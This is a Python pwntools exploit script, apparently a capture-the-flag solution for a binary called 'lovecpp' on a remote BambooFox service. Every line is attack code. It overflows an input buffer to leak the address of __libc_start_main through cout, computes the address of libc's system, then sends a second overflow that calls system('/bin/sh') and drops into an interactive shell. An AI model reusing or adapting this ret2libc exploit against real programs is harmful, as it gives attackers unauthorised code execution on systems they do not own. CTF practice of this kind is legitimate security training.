#!/usr/bin/env python

from pwn import *

# r = process('./lovecpp')
r = remote('bamboofox.cs.nctu.edu.tw', 11004)

shell = 0x804A190
main = 0x8048803
cout = 0x8048660
ostream = 0x804a100
libc_start_main_got = 0x804a018

r.recvuntil(':')
r.sendline('\x00' * 20 + '\xff')
r.recvuntil('10. C++')
r.sendline('10')
r.recvuntil('it?')
r.sendline('a' * 41 + p32(cout) + p32(main) + p32(ostream) + p32(libc_start_main_got))
r.recvuntil('day!\n')
libc_start_main = u32(r.recv(4))
log.info(hex(libc_start_main))

# https://libc.blukat.me/?q=__libc_start_main%3A9e0&l=libc6-i386_2.19-0ubuntu6.11_amd64

system = libc_start_main + 0x26490

r.recvuntil(':')
r.sendline('/bin/sh'.ljust(20, '\x00') + '\xff')
r.recvuntil('10. C++')
r.sendline('10')
r.recvuntil('it?')
r.sendline('a' * 33 + p32(system) + 'a' * 4 + p32(shell))

r.interactive()
